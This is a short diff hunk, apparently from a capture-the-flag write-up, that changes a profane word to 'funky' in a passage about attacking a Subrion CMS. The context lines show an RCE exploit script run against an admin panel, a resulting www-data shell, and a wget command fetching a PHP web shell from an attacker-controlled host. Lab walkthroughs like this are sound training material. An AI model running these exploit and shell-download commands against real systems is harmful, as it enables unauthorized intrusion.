@@ -108,7 +108,7 @@ python3 SubrionRCE.py -u http://<IP>/subrion/panel/ -l admin -p [REDACTED]
 $ whoami
 www-data
 ```
-I then uploaded another shell, because this one is a bit fucky, and upgraded using a python TTY
+I then uploaded another shell, because this one is a bit funky, and upgraded using a python TTY
 ```
 $ wget http://10.18.116.220:8000/shell.php
 
